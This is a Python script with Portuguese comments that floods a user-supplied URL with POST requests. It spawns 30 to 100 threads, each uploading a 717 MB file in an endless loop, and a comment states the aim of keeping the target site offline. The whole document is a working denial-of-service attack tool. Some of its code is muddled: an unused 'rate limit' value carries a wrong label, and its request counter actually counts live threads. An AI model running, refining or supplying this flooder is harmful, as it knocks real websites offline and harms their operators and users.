import argparse
import requests
import threading
import time
import random

# Configuração do argumento da linha de comando
parser = argparse.ArgumentParser(description='Envio de solicitações e arquivos de dados para um site.')
parser.add_argument('url', type=str, help='URL do site alvo')
args = parser.parse_args()

url = args.url
rate_limit = 100000000000  # Limite de taxa de bits (1 Gbps)

def send_request():
    while True:
        try:
            # Criar um arquivo de dados com 717MB
            file_size = 717 * 1024 * 1024  # 717MB em bytes
            data = bytearray(file_size)
            files = {"file": ("data.bin", data)}
            
            # Enviar solicitação POST com o arquivo de dados
            response = requests.post(url, files=files, timeout=10)  # Adiciona timeout de 10 segundos
            if response.status_code == 200:
                print("Dados enviados com sucesso")
                # Adicionar atraso deliberado para manter o site fora do ar
                time.sleep(30)
            else:
                print("Falha ao enviar dados")
        except requests.exceptions.Timeout:
            print("Timeout de conexão, tentando novamente...")
            continue
        except requests.exceptions.ConnectionError:
            print("Erro de conexão, tentando novamente...")
            continue

# Iniciar threads para enviar solicitações
def start_threads():
    while True:
        try:
            num_threads = random.randint(30, 100)  # Número aleatório de threads entre 30 e 100
            threads = []
            for _ in range(num_threads):
                thread = threading.Thread(target=send_request)
                thread.daemon = True
                threads.append(thread)
                thread.start()

            # Monitorar a taxa de solicitações
            start_time = time.time()
            while True:
                elapsed_time = time.time() - start_time
                if elapsed_time >= 1:
                    print(f"Taxa de solicitações: {sum([thread.is_alive() for thread in threads])} solicitações por segundo")
                    start_time = time.time()
        except KeyboardInterrupt:
            break

# Executar o envio de solicitações a cada 1 a 3 segundos e os 717MB a cada 7 segundos
try:
    while True:
        start_threads()
        time.sleep(random.randint(1, 3))
        send_request()
        time.sleep(7)
except KeyboardInterrupt:
    pass